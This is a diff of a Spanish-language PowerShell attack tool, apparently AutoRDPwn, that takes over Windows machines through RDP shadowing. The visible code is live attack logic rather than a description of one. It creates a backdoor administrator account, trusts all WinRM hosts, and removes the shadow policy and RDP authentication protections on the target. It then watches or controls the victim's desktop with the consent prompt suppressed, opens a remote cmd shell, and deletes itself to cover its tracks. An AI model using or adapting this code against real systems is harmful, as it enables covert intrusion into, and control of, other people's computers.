@@ -178,8 +178,8 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
       } until ($input -in '1','2','3','4','5')
 
    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ""
-   if ($hash) { echo "AutoRDPwn" > credentials.dat }
-   $user = type credentials.dat ; $password = type credentials.dat | ConvertTo-SecureString -AsPlainText -Force ; del credentials.dat
+   if ($hash) { echo "AutoRDPwn" > credentials.dat 
+   $user = type credentials.dat ; $password = type credentials.dat | ConvertTo-SecureString -AsPlainText -Force ; del credentials.dat }
    $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
    $RDP = New-PSSession -Computer $computer -credential $credential      
    $Host.UI.RawUI.ForegroundColor = 'Yellow'
@@ -188,14 +188,12 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
    winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
 
    do { 
-        Write-Host ""
-        $Host.UI.RawUI.ForegroundColor = 'Gray'
+        $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ""
         $input = Read-Host -Prompt "Quieres ver o controlar el equipo?"
         switch ($input) {
 
         'ver' {
-        $control = "false"
-        Write-Host ""
+        $control = "false" ; Write-Host ""
 	invoke-command -session $RDP[0] -scriptblock {
         powershell Set-Executionpolicy UnRestricted
         REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f 1> $null
@@ -203,8 +201,7 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
 	Write-Host "Modificando permisos para visualizar el equipo remoto.." -ForegroundColor Green }}
 
         'controlar' {
-        $control = "true"
-        Write-Host ""
+        $control = "true" ; Write-Host ""
 	invoke-command -session $RDP[0] -scriptblock {
         powershell Set-Executionpolicy UnRestricted
         REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f 1> $null
@@ -233,11 +230,9 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
     $hostname = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "host" | select -First 1).split(':')[1].trim()}
     Write-Host "Detectando versión del sistema operativo en $hostname.." -ForegroundColor Magenta 
     $version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()}
-    $Host.UI.RawUI.ForegroundColor = 'Gray'
+    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ""
 
-    if($version -Like '*Server*') {
-        Write-Host ""
-        Write-Host "$version detectado"
+      if($version -Like '*Server*') { Write-Host "$version detectado"
         invoke-command -session $RDP[0] -scriptblock {
         (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
         Write-Host ""
@@ -250,8 +245,7 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
         if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
         else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
-    else { Write-Host ""
-        Write-Host "$version detectado, aplicando parche.."
+      else { Write-Host "$version detectado, aplicando parche.."
         invoke-command -session $RDP[0] -scriptblock {
         add-type @"
         using System.Net;
@@ -279,11 +273,10 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
     if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
     else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
 
-Write-Host ""
-$session = get-pssession
+
+$session = get-pssession ; Write-Host ""
 if ($session){ Write-Host "Iniciando conexión remota.." -ForegroundColor Gray ; sleep -milliseconds 3000 
 $PlainTextPassword = ConvertFrom-SecureToPlain $password
 if ($console){ Clear-Host ; Write-Host '>> Consola semi-interactiva en equipo remoto <<' ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host "Algo salió mal, cerrando el programa.." -ForegroundColor Red ; sleep -milliseconds 3000 }
-$PScript = $MyInvocation.MyCommand.Definition
-Remove-Item $PScript
+$PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript
